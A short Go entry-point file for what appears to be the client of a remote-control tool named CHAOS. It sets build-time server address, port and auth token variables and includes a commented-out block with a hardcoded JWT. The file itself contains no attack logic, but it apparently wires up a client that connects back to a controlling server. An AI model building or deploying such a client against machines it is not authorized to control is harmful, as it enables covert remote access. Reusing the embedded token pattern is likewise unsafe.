package main

import (
	"github.com/tiagorlampert/CHAOS/client/app"
	"github.com/tiagorlampert/CHAOS/client/app/environment"
	"github.com/tiagorlampert/CHAOS/client/app/ui"
)

var (
	Version       = "dev"
	Port          = ""
	ServerAddress = ""
	Token         = ""
)

//var (
//	Version       = "dev"
//	Port          = "8080"
//	ServerAddress = "localhost"
//	Token         = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdXRob3JpemVkIjp0cnVlLCJleHAiOjE2OTY2MjE4MDEsInVzZXIiOiJkZWZhdWx0In0.QotMkmtA9V5910-Xo0BdWizd5cM51xphR0bDMTqfCjw"
//)

func main() {
	ui.ShowMenu(Version, ServerAddress, Port)

	app.New(environment.Load(ServerAddress, Port, Token)).Run()
}
